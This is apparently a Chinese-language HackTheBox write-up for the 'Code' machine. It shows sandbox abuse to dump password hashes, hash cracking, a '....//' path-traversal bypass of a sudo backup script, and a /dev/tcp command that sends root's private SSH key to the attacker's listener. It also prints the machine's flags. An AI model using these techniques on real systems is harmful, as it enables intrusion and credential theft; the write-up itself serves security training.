---
layout: config.default_layout
title: HackTheBox-Season7-Code
date: 2025-04-04 00:41:27
updated: 2025-04-04 00:41:41
comments: true
tags: [HackTheBox,Linux靶机,encrypt]
categories: 靶机
---

# Season7-Code

> https://app.hackthebox.com/machines/653 | `esay`
> 

## 前期踩点

```bash
⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 10.10.11.62
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:09 EDT
Nmap scan report for 10.10.11.62
Host is up (0.15s latency).
Not shown: 64591 filtered tcp ports (no-response), 943 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 37.29 seconds
```

就扫描出一个`22`端口，不对劲继续扫

```bash
⚡ root@kali  ~/Desktop/test/Code  nmap -sS -min-rate 10000 -p- 10.10.11.62
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:34 EDT
Warning: 10.10.11.62 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.62
Host is up (0.84s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 33.23 seconds
```

新端口是一个代码编辑器`Python Code Editor`

```bash
⚡ root@kali  ~/Desktop/test/Code  nmap -sT -A -T4 -O -p 22,5000 10.10.11.62     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:30 EDT
Nmap scan report for 10.10.11.62
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   204.69 ms 10.10.16.1
2   156.61 ms 10.10.11.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.11 seconds
```

## WEB 渗透

可以执行python命令，首先尝试一下`os` 库

![image.png](image56.png)

提示`Use of restricted keywords is not allowed.` 经过测试是将`import` 、`os` 等关键字给过滤了

右边可以创建账户，这里创建了用户`sunset`

![image.png](image57.png)

可以看到存在`MyCodes` ，我们将代码保存为`test`试试

![image.png](image58.png)

尝试一下语法注入

![image.png](image59.png)

可以成功回显，再尝试一下使用模板语法

![image.png](image60.png)

也是成功回显了，那么该应用是使用`Flask`搭建的`Web`应用

使用`SSTImap`尝试模板注入

```bash
python sstimap.py -u http://10.10.11.62:5000/run_code -H 'application/x-www-form-urlencoded; charset=UTF-8' -m 'POST' -d 'code=print(render_template_string("{{*}}"))'
```

结果就是没办法利用，但是知道了存在`jinja2`

![image.png](image61.png)

因为存在登陆操作，所以可能可以进行操作数据库，尝试一下数据库语法

![image.png](image62.png)

有回显，通过`GPT`进行构造

```bash
code=print([user.username for user in User.query.all()])
// output
{"output":"['development', 'martin', 'test']\n"}
```

```bash

code=print([user.password for user in User.query.all()])
// output
{"output":"['759b74ce43947f5f4c91aeddc3e5bad3', '3de6f30c4a09c27fc71932bfc68474be', '098f6bcd4621d373cade4e832627b4f6']\n"}
```

得到两组用户名密码`development:759b74ce43947f5f4c91aeddc3e5bad3` 和`martin:3de6f30c4a09c27fc71932bfc68474be`

将密码保存到`pass.txt`使用`John`破解

```bash
⚡ root@kali  ~/Desktop/test/Code  john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 pass.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
development      (?)     
nafeelswordsmaster (?)     
2g 0:00:00:00 DONE (2025-03-25 00:26) 3.333g/s 8711Kp/s 8711Kc/s 9050KC/s nafi79..naerulz
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

```bash
development:development
martin:nafeelswordsmaster
```

得到两个账户，直接尝试`SSH` 

最后使用`martin`成功登录

```bash
⚡ root@kali  ~/Desktop/test/Code  ssh martin@10.10.11.62
martin@10.10.11.62's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 25 Mar 2025 04:10:56 AM UTC

  System load:           0.3
  Usage of /:            51.4% of 5.33GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             234
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.62
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c80e

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Mar 25 04:10:56 2025 from 10.10.16.7
martin@code:~$ 
```

## Get Flag

信息收集一波

```bash
martin@code:~$ uname -a
Linux code 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
martin@code:~$ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:c8:0e brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.62/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:c80e/64 scope global dynamic mngtmpaddr 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:c80e/64 scope link 
       valid_lft forever preferred_lft forever
```

```bash
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

查看一下我们可以以`Root`权限运行的脚本

```bash
martin@code:~/backups/home/app-production/app$ cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

脚本接收`task.json` ，读取 `directories_to_archive` 字段的目录列表，只允许 `/var/` 和 `/home/` 目录下的路径，其他路径会触发错误并退出

尝试构造`Json`文件`task.json`

```bash
{
	"directories_to_archive":[
		"/home/app-production/"
	]
}
// run
martin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/03/25 06:38:38 🍀 backy 1.2
2025/03/25 06:38:38 📋 Working with task.json ...
2025/03/25 06:38:38 🔰 Task configuration: destination must be specified!
2025/03/25 06:38:38 ❗ Can't read provided task configuration
```

缺少`desination`参数，应该是保存到哪的参数

```bash
{
	"directories_to_archive":[
		"/home/app-production/"
	],
	"destination":"/home/martin"
}
// run
martin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/03/25 06:41:28 🍀 backy 1.2
2025/03/25 06:41:28 📋 Working with task.json ...
2025/03/25 06:41:28 💤 Nothing to sync
2025/03/25 06:41:28 📤 Archiving: [/home/app-production]
2025/03/25 06:41:28 📥 To: /home/martin ...
2025/03/25 06:41:28 📦
```

执行完成后多出来一个压缩包

```bash
martin@code:~$ ls
backups  code_home_app-production_2025_March.tar.bz2  task.json
```

对其进行解压，解压完毕后可以发现是用户`app-production` 的家目录，并且存在`user.txt`

```bash
martin@code:~/home/app-production$ cat user.txt 
4332e6b51ad86bfd87072af615996ff1
```

再构造读取`root`的家目录

```bash
{
	"directories_to_archive":[
		"/home/../root/"
	],
	"destination":"/home/martin"
}
// run
martin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/03/25 06:46:56 🍀 backy 1.2
2025/03/25 06:46:56 📋 Working with task.json ...
2025/03/25 06:46:56 💤 Nothing to sync
2025/03/25 06:46:56 📤 Archiving: [/home/root]
2025/03/25 06:46:56 📥 To: /home/martin ...
2025/03/25 06:46:56 📦
2025/03/25 06:46:56 💢 Archiving failed for: /home/root
2025/03/25 06:46:56 ❗ Archiving completed with errors
```

构造双写绕过

```bash
{
	"directories_to_archive":[
		"/home/....//root/"
	],
	"destination":"/home/martin"
}
// run
rtin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/03/25 06:49:24 🍀 backy 1.2
2025/03/25 06:49:24 📋 Working with task.json ...
2025/03/25 06:49:24 💤 Nothing to sync
2025/03/25 06:49:24 📤 Archiving: [/home/../root]
2025/03/25 06:49:24 📥 To: /home/martin ...
2025/03/25 06:49:24 📦
```

成功，读取root.txt

```bash
martin@code:~/root$ cat root.txt 
372cf788ca3e30b86c01d19cb8bac1d9
```

## Get Root Shell

解压问就按后看到存在`.ssh`文件夹，并且存在私钥`id_rsa`

转储私钥到攻击机

```bash
// Kali
**nc -lvp 1234 > sshkey**
// Code
**martin@code:~/root/.ssh$ cat id_rsa > /dev/tcp/10.10.16.7/1234**
```

![image.png](image63.png)

修改权限为`600` ，并使用私钥进行登录

```bash
⚡ root@kali  ~/Desktop/test/Code  chmod 600 sshkey                      
⚡ root@kali  ~/Desktop/test/Code  ssh root@10.10.11.62 -i sshkey          
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)     
                                                                              
 * Documentation:  https://help.ubuntu.com                                    
 * Management:     https://landscape.canonical.com                            
 * Support:        https://ubuntu.com/pro                                     
                                                                              
 System information as of Tue 25 Mar 2025 07:10:19 AM UTC                     
                                                                              
  System load:           0.0                                                  
  Usage of /:            51.3% of 5.33GB                                      
  Memory usage:          13%                                                  
  Swap usage:            0%                                                   
  Processes:             236                                                  
  Users logged in:       1                                                    
  IPv4 address for eth0: 10.10.11.62                                          
  IPv6 address for eth0: dead:beef::250:56ff:feb9:4461                        
                                                                              
                                                                              
Expanded Security Maintenance for Applications is not enabled.                
                                                                              
0 updates can be applied immediately.                                         
                                                                              
Enable ESM Apps to receive additional future security updates.                
See https://ubuntu.com/esm or run: sudo pro status                            
                                       
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings 
                                                                              
                                                                              
Last login: Tue Mar 25 07:10:19 2025 from 10.10.16.7                          
root@code:~#                           
```
